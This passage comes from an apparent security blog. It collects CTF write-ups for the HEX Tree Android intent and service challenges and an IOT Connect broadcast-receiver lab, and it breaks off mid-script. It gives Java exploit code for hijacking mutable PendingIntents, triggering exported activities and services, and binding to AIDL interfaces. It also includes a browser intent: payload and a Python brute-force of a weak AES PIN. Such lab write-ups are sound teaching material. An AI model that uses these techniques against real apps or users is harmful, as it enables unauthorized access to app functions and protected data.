//Log.d(\u0026#34;query_parmaeter3\u0026#34;, query_parmaeter3); String authToken = data.getQueryParameter(\u0026#34;authToken\u0026#34;); String authChallenge = data.getQueryParameter(\u0026#34;authChallenge\u0026#34;); Intent sendIntent = new Intent(); sendIntent.setAction(\u0026#34;android.intent.action.VIEW\u0026#34;); sendIntent.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;,\u0026#34;io.hextree.attacksurface.activities.Flag14Activity\u0026#34;); sendIntent.setData(Uri.parse(\u0026#34;hex://token?authToken=\u0026#34;+authToken+\u0026#34;\u0026amp;type=admin\u0026amp;authChallenge=\u0026#34;+authChallenge)); startActivity(sendIntent); Flag 15 #\rتحليل الكود #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag15Activity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; الـ \u0026lt;intent-filter\u0026gt; مافيهوش host أو path filter؟\npublic void onCreate(Bundle bundle) { Intent intent = getIntent(); if (intent == null) { return; } String action = intent.getAction(); if (action == null) { Intent intent2 = new Intent(\u0026#34;android.intent.action.VIEW\u0026#34;); intent2.setData(Uri.parse(\u0026#34;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=\u0026#34; + Uri.encode(\u0026#34;intent:#Intent;...\u0026#34;))); startActivity(intent2); return; } if (isDeeplink(intent) \u0026amp;\u0026amp; action.equals(\u0026#34;io.hextree.action.GIVE_FLAG\u0026#34;)) { Bundle extras = intent.getExtras(); if (extras == null) { finish(); } String string = extras.getString(\u0026#34;action\u0026#34;, \u0026#34;open\u0026#34;); if (extras.getBoolean(\u0026#34;flag\u0026#34;, false) \u0026amp;\u0026amp; string.equals(\u0026#34;flag\u0026#34;)) { this.f.addTag(Boolean.valueOf(extras.getBoolean(\u0026#34;flag\u0026#34;, false))); this.f.addTag(string); success(this); } else if (string.equals(\u0026#34;open\u0026#34;)) { Toast.makeText(this, \u0026#34;Website: \u0026#34; + extras.getString(\u0026#34;message\u0026#34;, \u0026#34;open\u0026#34;), 1).show(); } } الحل #\rالـ intent: scheme في Chrome بيحل ده بإنه يسمح للموقع يعمل explicit intents فنقدر نعمل بتاعنا ونبعته باستخدام موقع hex وتشغيله على الموبايل\nintent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action.GIVE_FLAG;S.action=flag;S.open=flag;B.flag=true;end; Flag 22 #\rتحليل الكود #\rpublic void onCreate(Bundle bundle) { PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra(\u0026#34;PENDING\u0026#34;); if (pendingIntent != null) { try { Intent intent = new Intent(); intent.getExtras(); intent.putExtra(\u0026#34;success\u0026#34;, true); this.f.addTag(intent); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); pendingIntent.send(this, 0, intent); success(null, this); } catch (Exception e) { e.printStackTrace(); } } } الـ activity بيشيك على Pending intent اسمه \u0026quot;PENDING\u0026quot; ولو النتيجة موجودة بيضيف للـ intent \u0026quot;success\u0026quot; true و \u0026quot;flag\u0026quot; بعدين يبعته تاني\nالحل #\rمحتاجين نبعت Mutable intent عشان الـ app يقدر يضيف محتوى ليه\nContext context = this; Intent receivedIntent = getIntent(); if (receivedIntent.getParcelableExtra(\u0026#34;PENDING\u0026#34;) != null) { String flag = receivedIntent.getStringExtra(\u0026#34;flag\u0026#34;); Log.d(\u0026#34;Flag22\u0026#34;, flag); }else{ Log.d(\u0026#34;Flag22\u0026#34;, \u0026#34;???\u0026#34;); Intent atackIntent = new Intent(); atackIntent.setClassName(getPackageName(),getPackageName()+ \u0026#34;.pendingIntent\u0026#34;); PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, atackIntent, PendingIntent.FLAG_MUTABLE); Intent senderIntent = new Intent(); senderIntent.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag22Activity\u0026#34;); senderIntent.putExtra(\u0026#34;PENDING\u0026#34;, pendingIntent); startActivity(senderIntent); } Flag 23 #\rتحليل الكود #\rpublic void onCreate(Bundle bundle) { Intent intent = getIntent(); String action = intent.getAction(); if (action == null) { Intent intent2 = new Intent(\u0026#34;io.hextree.attacksurface.GIVE_FLAG\u0026#34;); intent2.setClassName(getPackageName(), Flag23Activity.class.getCanonicalName()); PendingIntent activity = PendingIntent.getActivity(getApplicationContext(), 0, intent2, 33554432); Intent intent3 = new Intent(\u0026#34;io.hextree.attacksurface.MUTATE_ME\u0026#34;); intent3.addFlags(8); intent3.putExtra(\u0026#34;pending_intent\u0026#34;, activity); startActivity(intent3); return; } if (action.equals(\u0026#34;io.hextree.attacksurface.GIVE_FLAG\u0026#34;)) { if (intent.getIntExtra(\u0026#34;code\u0026#34;, -1) == 42) { this.f.addTag(42); success(this); } else { Toast.makeText(this, \u0026#34;Condition not met for flag\u0026#34;, 0).show(); } } } الأول بيدور على intent ولو action فاضي بيعمل pending intent مع intent2 كـ base بتاعه مع action \u0026quot;io.hextree.attacksurface.GIVE_FLAG\u0026quot; و intent تالت مع action \u0026quot;io.hextree.attacksurface.MUTATE_ME\u0026quot;، بعدين بيشيك لو الـ response المستقبل فيه action io.hextree.attacksurface.GIVE_FLAG ولا لأ ولو كده يبقى فيه extra code بقيمة 42\nالحل #\rنعمل class هيستقبل intent بالـ action المحدد \u0026quot;io.hextree.attacksurface.MUTATE_ME\u0026quot;\n\u0026lt;activity android:name=\u0026#34;.pendingHelper\u0026#34; android:exported=\u0026#34;true\u0026#34; \u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.attacksurface.MUTATE_ME\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; بعدين لما نجيب الـ intent ندور على pending intent باسم pending_intent، بعدين نعمل intent مع action \u0026quot;io.hextree.attacksurface.GIVE_FLAG\u0026quot; ونحط extra code بقيمة 42 ونحاول نبعته (ممكن تتجاهل الـ condition ده للـ debugging عشان يساعد)\nIntent receivedIntent = getIntent(); if (receivedIntent.getParcelableExtra(\u0026#34;pending_intent\u0026#34;) != null) { PendingIntent pendingIntent = receivedIntent.getParcelableExtra(\u0026#34;pending_intent\u0026#34;); Intent intent = new Intent(); intent.setAction(\u0026#34;io.hextree.attacksurface.GIVE_FLAG\u0026#34;); intent.putExtra(\u0026#34;code\u0026#34;, 42); try { pendingIntent.send(this, 0, intent); } catch (PendingIntent.CanceledException e) { throw new RuntimeException(e); } }else{ Log.d(\u0026#34;Nothing\u0026#34;,\u0026#34;مافيش pending intent وصل\u0026#34; ); } ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/posts/ctf/mobile/hex/hex_intent/","section":"Posts","summary":"","title":"HEX Tree intent تحديات","type":"posts"},{"content":"\rFlag 24 #\rCode analysis #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag24Activity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; public void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); Intent intent = getIntent(); String stringExtra = intent.getStringExtra(\u0026#34;secret\u0026#34;); this.f.addTag(intent.getAction()); if (Flag24Service.secret.equals(stringExtra)) { success(this); } } The activity waits for an intent that has secret extra string and if it\u0026rsquo;s equal to the same value in Flag24Service we get our flag. But since we cant get in need another way\n\u0026lt;service android:name=\u0026#34;io.hextree.attacksurface.services.Flag24Service\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.services.START_FLAG24_SERVICE\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/service\u0026gt; this an exposed service that listens to action named io.hextree.services.START_FLAG24_SERVICE\n@Override // android.app.Service public int onStartCommand(Intent intent, int i, int i2) { if (intent.getAction().equals(\u0026#34;io.hextree.services.START_FLAG24_SERVICE\u0026#34;)) { success(); } return super.onStartCommand(intent, i, i2); } private void success() { Intent intent = new Intent(this, (Class\u0026lt;?\u0026gt;) Flag24Activity.class); intent.setAction(\u0026#34;io.hextree.services.START_FLAG24_SERVICE\u0026#34;); intent.putExtra(\u0026#34;secret\u0026#34;, secret); intent.addFlags(268468224); intent.putExtra(\u0026#34;hideIntent\u0026#34;, true); startActivity(intent); } In the service when it\u0026rsquo;s started it checks for the action of intent and when it\u0026rsquo;s true a method that will create an intent with extra string secret and will start flag24activity\nSolution #\rSending an intent with action \u0026quot;io.hextree.services.START_FLAG24_SERVICE\u0026quot; to the service will do the trick\nIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag24Service\u0026#34;); send.setAction(\u0026#34;io.hextree.services.START_FLAG24_SERVICE\u0026#34;); startService(send); Flag 25 #\rCode analysis #\rboolean lock1 = false; boolean lock2 = false; boolean lock3 = false; public int onStartCommand(Intent intent, int i, int i2) { if (intent != null) { if (intent.getAction().equals(\u0026#34;io.hextree.services.UNLOCK1\u0026#34;)) { this.lock1 = true; } if (intent.getAction().equals(\u0026#34;io.hextree.services.UNLOCK2\u0026#34;)) { if (this.lock1) { this.lock2 = true; } else { resetLocks(); } } if (intent.getAction().equals(\u0026#34;io.hextree.services.UNLOCK3\u0026#34;)) { if (this.lock2) { this.lock3 = true; } else { resetLocks(); } } if (this.lock1 \u0026amp;\u0026amp; this.lock2 \u0026amp;\u0026amp; this.lock3) { success(); resetLocks(); } } } private void success() { Intent intent = new Intent(this, (Class\u0026lt;?\u0026gt;) Flag25Activity.class); intent.putExtra(\u0026#34;secret\u0026#34;, secret); intent.putExtra(\u0026#34;lock\u0026#34;, \u0026#34;lock1\u0026#34;); intent.putExtra(\u0026#34;lock2\u0026#34;, \u0026#34;lock3\u0026#34;); startActivity(intent); } This service has 3 variables for 3 locks and with each lock is opened \u0026ldquo;set to true\u0026rdquo; with each intent sent with valid action for example : lock1 = true when action is io.hextree.services.UNLOCK1 and when all 3 locks are open a method is called that will create an intent with some extra strings then activity25 needs so that we get our flag\nSolution #\rsince services keep the state of variables as long as service is running so we will send 3 intents to the service with that 3 locks actions\nIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag25Service\u0026#34;); send.setAction(\u0026#34;io.hextree.services.UNLOCK1\u0026#34;); startService(send); send.setAction(\u0026#34;io.hextree.services.UNLOCK2\u0026#34;); startService(send); send.setAction(\u0026#34;io.hextree.services.UNLOCK3\u0026#34;); startService(send); Flag 26 #\rCode analysis #\rpublic static final int MSG_SUCCESS = 42; class IncomingHandler extends Handler { String echo; IncomingHandler(Looper looper) { super(looper); this.echo = \u0026#34;\u0026#34;; } @Override // android.os.Handler public void handleMessage(Message message) { Log.i(\u0026#34;Flag26Service\u0026#34;, \u0026#34;handleMessage(\u0026#34; + message.what + \u0026#34;)\u0026#34;); if (message.what == 42) { Flag26Service.this.success(this.echo); } else { super.handleMessage(message); } } } The service is listening for incoming messages using IncomingHandler and If the message type (message.what) is 42 it will call success method\nSolution #\rSo binds to Flag26Service and sends a message with what = 42 to trigger the success condition. First we establish a server connection that will have our message and send it then we bind to it with bindservice\nprivate ServiceConnection serviceConnection1 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { serviceMessenger = new Messenger(service); Message msg = Message.obtain(null, 42); try{ serviceMessenger.send(msg); } catch (RemoteException e){ throw new RuntimeException(e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; Intent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag26Service\u0026#34;); bindService(send,serviceConnection1, Context.BIND_AUTO_CREATE); Flag 27 #\rCode analysis #\rpublic void handleMessage(Message message) { int i = message.what; if (i == 1) { this.echo = message.getData().getString(\u0026#34;echo\u0026#34;); Toast.makeText(Flag27Service.this.getApplicationContext(), this.echo, 0).show(); return; } if (i != 2) { if (i == 3) { String string = message.getData().getString(\u0026#34;password\u0026#34;); if (!this.echo.equals(\u0026#34;give flag\u0026#34;) || !this.password.equals(string)) { Flag27Service.this.sendReply(message, \u0026#34;no flag\u0026#34;); return; } else { Flag27Service.this.sendReply(message, \u0026#34;success! Launching flag activity\u0026#34;); Flag27Service.this.success(this.echo); return; } } super.handleMessage(message); return; } The service processes messages based on message.what (an integer representing the message type):\ncase = 1: an echo message is extracted and displayed via a toast case = 3: string password \u0026amp; echo are extracted and compared to some values and if true we get our flag if (message.obj == null) { Flag27Service.this.sendReply(message, \u0026#34;Error\u0026#34;); return; } Message obtain = Message.obtain((Handler) null, message.what); Bundle bundle = new Bundle(); String uuid = UUID.randomUUID().toString(); this.password = uuid; bundle.putString(\u0026#34;password\u0026#34;, uuid); obtain.setData(bundle); try { message.replyTo.send(obtain); Flag27Service.this.sendReply(message, \u0026#34;Password\u0026#34;); } catch (RemoteException e) { throw new RuntimeException(e); } } } case = 2 : if message object is not null it will generates a random UUID as a password then Sends the password back to the us via message.replyTo. public void sendReply(Message message, String str) { try { Message obtain = Message.obtain((Handler) null, message.what); obtain.getData().putString(\u0026#34;reply\u0026#34;, str); message.replyTo.send(obtain); } catch (RemoteException e) { e.printStackTrace(); } } Sends a reply back to the client using message.replyTo. The reply contains: The same what value as the original message. A reply string in the Bundle. Solution #\rwe need to create a connection to service and obtain the result with value 2 to get password then we will use it and send it along with echo and we will use IncomingMessageHandle() to send message content\nprivate static Messenger serviceMessenger = null; private static String obtainedPassword; private static final Messenger clientMessegener = new Messenger(new services.IncomingMessageHandle()); private ServiceConnection serviceConnection2 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder binder) { serviceMessenger = new Messenger(binder); Message msg = Message.obtain(null, 2); msg.obj = new Bundle(); msg.replyTo = new Messenger(new IncomingMessageHandle()); try{ serviceMessenger.send(msg); } catch (RemoteException e){ throw new RuntimeException(e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; static class IncomingMessageHandle extends Handler { IncomingMessageHandle() {super(Looper.getMainLooper());} @Override public void handleMessage(Message msg) { Bundle reply = msg.getData(); obtainedPassword = reply.getString(\u0026#34;password\u0026#34;); if(reply != null \u0026amp;\u0026amp; obtainedPassword != null) { Log.i(\u0026#34;msg\u0026#34;, reply.toString()); Log.d(\u0026#34;password\u0026#34;, \u0026#34;Obtained password: \u0026#34; + obtainedPassword); msg = Message.obtain(null, 1); Bundle bundle = new Bundle(); bundle.putString(\u0026#34;echo\u0026#34;, \u0026#34;give flag\u0026#34;); msg.setData(bundle); msg.replyTo = clientMessegener; try { serviceMessenger.send(msg); } catch (RemoteException e) { e.printStackTrace(); } msg = Message.obtain(null, 3); bundle = new Bundle(); bundle.putString(\u0026#34;password\u0026#34;, obtainedPassword); msg.setData(bundle); msg.replyTo = clientMessegener; try { serviceMessenger.send(msg); } catch (RemoteException e) { e.printStackTrace(); } } else{ Log.i(\u0026#34;X\u0026#34;, \u0026#34;NO Reply\u0026#34;); } } } Intent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag27Service\u0026#34;); bindService(send,serviceConnection2, Context.BIND_AUTO_CREATE); Flag 28 #\rCode analysis #\rpackage io.hextree.attacksurface.services; private final IFlag28Interface.Stub binder = new IFlag28Interface.Stub() { @Override // io.hextree.attacksurface.services.IFlag28Interface public boolean openFlag() throws RemoteException { return success(); } public boolean success() { Intent intent = new Intent(); intent.setClass(Flag28Service.this, Flag28Activity.class); intent.putExtra(\u0026#34;secret\u0026#34;, Flag28Service.secret); intent.addFlags(268468224); intent.putExtra(\u0026#34;hideIntent\u0026#34;, true); Flag28Service.this.startActivity(intent); return true; } }; by looking at the onBind() method that returns some kind of .Stub binder Which means we are dealing with AIDL file, Looking more we can see that it only implements a single method of type Boolean that just by calling The method we get success called\nSolution #\rIn order for our app to call this method it needs to know it in the first place right? so reversing the aidl we get\nDefining the file #\r// IFlag28Interface.aidl package io.hextree.attacksurface.services; interface IFlag28Interface { boolean openFlag(); } now creating a connection to service and using IFlag28Interface to get access to methods in it we call openFlag\nIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag28Service\u0026#34;); ServiceConnection serviceConnection3 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { IFlag28Interface remoteService = IFlag28Interface.Stub.asInterface(service); try { remoteService.openFlag(); } catch (RemoteException e) { throw new RuntimeException(e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection3, Context.BIND_AUTO_CREATE); Class loading #\rIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag28Service\u0026#34;); ServiceConnection serviceConnection4 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { // Load the class dynamically ClassLoader classLoader = null; try { classLoader = services.this.createPackageContext(\u0026#34;io.hextree.attacksurface\u0026#34;, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader(); Class\u0026lt;?\u0026gt; iRemoteServiceClass; // Load the AIDL interface class iRemoteServiceClass = classLoader.loadClass(\u0026#34;io.hextree.attacksurface.services.IFlag28Interface\u0026#34;); Class\u0026lt;?\u0026gt; stubClass = null; for (Class\u0026lt;?\u0026gt; innerClass : iRemoteServiceClass.getDeclaredClasses()) { if (innerClass.getSimpleName().equals(\u0026#34;Stub\u0026#34;)) { stubClass = innerClass; break; } } // Get the asInterface method Method asInterfaceMethod = stubClass.getDeclaredMethod(\u0026#34;asInterface\u0026#34;, IBinder.class); // Invoke the asInterface method to get the instance of IRemoteService Object iRemoteService = asInterfaceMethod.invoke(null, service); // Call the init method and get the returned string Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;openFlag\u0026#34;); boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService); } catch (Exception e) { Log.e(\u0026#34;Flag29Service\u0026#34;, \u0026#34;Error creating package context\u0026#34;, e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE); Flag 29 #\rCode analysis #\rpackage io.hextree.attacksurface.services; private final IFlag29Interface.Stub binder = new IFlag29Interface.Stub() { Intent intent = new Intent(); @Override // io.hextree.attacksurface.services.IFlag29Interface public String init() throws RemoteException { Log.i(\u0026#34;Flag29\u0026#34;, \u0026#34;service.init()\u0026#34;); return this.pw; } @Override // io.hextree.attacksurface.services.IFlag29Interface public void authenticate(String str) throws RemoteException { Log.i(\u0026#34;Flag29\u0026#34;, \u0026#34;service.authenticate(\u0026#34; + str + \u0026#34;)\u0026#34;); if (str.equals(this.pw)) { this.intent.putExtra(\u0026#34;authenticated\u0026#34;, true); } else { this.intent.removeExtra(\u0026#34;authenticated\u0026#34;); } } @Override // io.hextree.attacksurface.services.IFlag29Interface public void success() throws RemoteException { Log.i(\u0026#34;Flag29\u0026#34;, \u0026#34;service.success()\u0026#34;); this.intent.setClass(Flag29Service.this, Flag29Activity.class); if (this.intent.getBooleanExtra(\u0026#34;authenticated\u0026#34;, false)) { this.intent.putExtra(\u0026#34;secret\u0026#34;, Flag29Service.secret); this.intent.addFlags(268435456); this.intent.putExtra(\u0026#34;hideIntent\u0026#34;, true); Flag29Service.this.startActivity(this.intent); } } }; The service uses init() to initiate flag29 and return a string then authenticate takes a string and if that string is the same an authenticated string is added to intent along with true value\npublic interface IFlag29Interface extends IInterface { public static final String DESCRIPTOR = \u0026#34;io.hextree.attacksurface.services.IFlag29Interface\u0026#34;; public static class Default implements IFlag29Interface { @Override // android.os.IInterface public IBinder asBinder() { return null; } //our 3 methods @Override // io.hextree.attacksurface.services.IFlag29Interface public void authenticate(String str) throws RemoteException { } @Override // io.hextree.attacksurface.services.IFlag29Interface public String init() throws RemoteException { return null; } @Override // io.hextree.attacksurface.services.IFlag29Interface public void success() throws RemoteException { } } public static abstract class Stub extends Binder implements IFlag29Interface { static final int TRANSACTION_authenticate = 2; static final int TRANSACTION_init = 1; static final int TRANSACTION_success = 3; okay now from here we have the DESCRIPTOR and the order of methods should be\ninit() authenticate() success() Solution #\rDefining the file #\rNow creating the aidl file with the order in mind we get\n// IFlag29Interface.aidl package io.hextree.attacksurface.services; interface IFlag29Interface { String init(); void authenticate(String str); void success(); } then in our app we create a service connection using IFlag29Interface and calling init() while saving the string returned in pass then passing it to authenticate() and finally calling success()\nIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag29Service\u0026#34;); ServiceConnection serviceConnection4 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { IFlag29Interface remoteService = IFlag29Interface.Stub.asInterface(service); try { String pass = remoteService.init(); remoteService.authenticate(pass); remoteService.success(); } catch (RemoteException e) { throw new RuntimeException(e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE); Class loading #\rIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag29Service\u0026#34;); ServiceConnection serviceConnection4 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { // Load the class dynamically ClassLoader classLoader = null; try { classLoader = services.this.createPackageContext(\u0026#34;io.hextree.attacksurface\u0026#34;, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader(); Class\u0026lt;?\u0026gt; iRemoteServiceClass; // Load the AIDL interface class iRemoteServiceClass = classLoader.loadClass(\u0026#34;io.hextree.attacksurface.services.IFlag29Interface\u0026#34;); Class\u0026lt;?\u0026gt; stubClass = null; for (Class\u0026lt;?\u0026gt; innerClass : iRemoteServiceClass.getDeclaredClasses()) { if (innerClass.getSimpleName().equals(\u0026#34;Stub\u0026#34;)) { stubClass = innerClass; break; } } // Get the asInterface method Method asInterfaceMethod = stubClass.getDeclaredMethod(\u0026#34;asInterface\u0026#34;, IBinder.class); // Invoke the asInterface method to get the instance of IRemoteService Object iRemoteService = asInterfaceMethod.invoke(null, service); // Call the init method and get the returned string Method initMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;init\u0026#34;); String password = (String) initMethod.invoke(iRemoteService); Log.d(\u0026#34;Flag29Service\u0026#34;, \u0026#34;Password: \u0026#34; + password); // Call the authenticate method with the password Method authenticateMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;authenticate\u0026#34;, String.class); authenticateMethod.invoke(iRemoteService, password); // Call the success method Method successMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;success\u0026#34;); successMethod.invoke(iRemoteService); } catch (Exception e) { Log.e(\u0026#34;Flag29Service\u0026#34;, \u0026#34;Error creating package context\u0026#34;, e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE); ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/ctf/mobile/hex/hex_services/","section":"","summary":"","title":"HEX Tree Services Challenges","type":"posts"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/implicit/","section":"Tags","summary":"","title":"Implicit","type":"tags"},{"content":"","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/intent/","section":"Tags","summary":"","title":"Intent","type":"tags"},{"content":"Android Broadcast Receiver Challenge\n🎯 Goal #\rThis challenge focuses on exploiting a security flaw related to the Broadcast Receiver in the IOT Connect application. The flaw allows unauthorized users to activate the master switch, which turns on all connected devices.\nThe goal is to send a broadcast in a way that only authenticated users should be able to trigger the master switch.\nAnalysis #\rExported from manifest #\rActivities #\rLoginActivity\nEntry point of the app (MAIN/LAUNCHER intent filter) SignupActivity\nMainActivity\nBroadcast Receivers #\rMasterReceiver\nHandles custom \u0026ldquo;MASTER_ON\u0026rdquo; broadcasts No permission protection ProfileInstallReceiver (AndroidX component)\nHandles profile installer operations (INSTALL_PROFILE, SKIP_FILE, etc.) Protected by android.permission.DUMP (signature-level permission) Exported but with permission requirement Moving on #\rNow after playing around with the app we understand that:\nyou can create and interact with the app as new user new users (guests) can\u0026rsquo;t try to run master key even if you have the correct 3-digit pin ![[Pasted image 20250715015025.png]]\nwhen searching for MasterReceiver receiver we find it dynamically implemented but not in a class names MasterReceiver but in CommunicationManager and that will cause us a minor problem in the future but now lets see what we have\nCode Deep Dive #\rpublic final BroadcastReceiver initialize(Context context) { masterReceiver = new BroadcastReceiver() { public void onReceive(Context context2, Intent intent) { if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, \u0026#34;MASTER_ON\u0026#34;)) { int key = intent.getIntExtra(\u0026#34;key\u0026#34;, 0); if (context2 != null) { if (Checker.INSTANCE.check_key(key)) { CommunicationManager.INSTANCE.turnOnAllDevices(context2); Toast.makeText(context2, \u0026#34;All devices are turned on\u0026#34;, 1).show(); } else { Toast.makeText(context2, \u0026#34;Wrong PIN!!\u0026#34;, 1).show(); } } } } }; BroadcastReceiver broadcastReceiver = masterReceiver; if (broadcastReceiver == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;masterReceiver\u0026#34;); broadcastReceiver = null; } context.registerReceiver(broadcastReceiver, new IntentFilter(\u0026#34;MASTER_ON\u0026#34;)); BroadcastReceiver broadcastReceiver2 = masterReceiver; if (broadcastReceiver2 != null) { return broadcastReceiver2; } Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;masterReceiver\u0026#34;); return null; so the class has a masterReceiver that will check for action: MASTER_ON as we know but it also wants aother requirement a key . going deeper and seeing this method Checker.INSTANCE.check_key() we find this lovely AES implementation\npublic final class Checker { public static final Checker INSTANCE = new Checker(); private static final String algorithm = \u0026#34;AES\u0026#34;; private static final String ds = \u0026#34;OSnaALIWUkpOziVAMycaZQ==\u0026#34;; private Checker() { } public final boolean check_key(int key) { try { return Intrinsics.areEqual(decrypt(ds, key), \u0026#34;master_on\u0026#34;); } catch (BadPaddingException e) { return false; } } public final String decrypt(String ds2, int key) { Intrinsics.checkNotNullParameter(ds2, \u0026#34;ds\u0026#34;); SecretKeySpec secretKey = generateKey(key); Cipher cipher = Cipher.getInstance(algorithm + \u0026#34;/ECB/PKCS5Padding\u0026#34;); cipher.init(2, secretKey); if (Build.VERSION.SDK_INT \u0026gt;= 26) { byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2)); Intrinsics.checkNotNull(decryptedBytes); return new String(decryptedBytes, Charsets.UTF_8); } throw new UnsupportedOperationException(\u0026#34;VERSION.SDK_INT \u0026lt; O\u0026#34;); } private final SecretKeySpec generateKey(int staticKey) { byte[] keyBytes = new byte[16]; byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8); Intrinsics.checkNotNullExpressionValue(staticKeyBytes, \u0026#34;getBytes(...)\u0026#34;); System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length)); return new SecretKeySpec(keyBytes, algorithm); } } This code implements a simple encryption checker that checks if the provided integer key can correctly decrypt a hardcoded ciphertext to produce the string \u0026ldquo;master_on\u0026rdquo;. sooo\nIn short #\rAlgorithm \u0026amp; Mode: Uses AES/ECB/PKCS5Padding Hardcoded Data: Ciphertext (ds): \u0026quot;OSnaALIWUkpOziVAMycaZQ==\u0026quot; (Base64-encoded) Expected plaintext: \u0026quot;master_on\u0026quot; and with that we have all the signs that tells us to brute force it\nCode Flow #\rcheck_key(int key):\nTakes an integer key Calls decrypt() with the hardcoded ciphertext (ds) and the key Compares the decrypted result with \u0026quot;master_on\u0026quot; decrypt(String ds2, int key):\nGenerates an AES key from the integer key (generateKey(key)) Initializes a cipher in decryption mode (2 = Cipher.DECRYPT_MODE) Decodes the Base64 ciphertext and decrypts it using AES/ECB Returns the decrypted string (UTF-8) generateKey(int staticKey):\nConverts the integer key to a UTF-8 byte array Copies it into a 16-byte key (AES-128 requires 128-bit keys) If the key is shorter than 16 bytes, the remaining bytes are 0 (due to System.arraycopy) The problem #\rWeak Cryptography\nUses AES/ECB mode (deterministic) 3-digit PIN → 1000 possible keys (bruteforceable) Hardcoded ciphertext (OSnaALIWUkpOziVAMycaZQ==) Insecure Broadcast\nNo permission protection No sender verification Exploitation #\rAfter some time like figuring out how to actually decode AES in python \u0026hellip;\u0026hellip; FINALY i ended up with this string\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad import base64 cipherTxT = \u0026#34;OSnaALIWUkpOziVAMycaZQ==\u0026#34; # Base64-encoded ciphertext PlainTxT = \u0026#34;master_on\u0026#34; def num_gen(): arr = [] digits = 3 # Number of digits format_str = f\u0026#34;{{:0{digits}d}}\u0026#34; for number in range(0, 1000): arr.append(format_str.format(number)) return arr def generate_key(pin): pin_str = str(pin) key_bytes = pin_str.encode(\u0026#39;utf-8\u0026#39;).ljust(16, b\u0026#39;\\x00\u0026#39;)[:16] # Pad to 16 bytes return key_bytes def decrypt(ciphertext, plaintext): ciphertext = 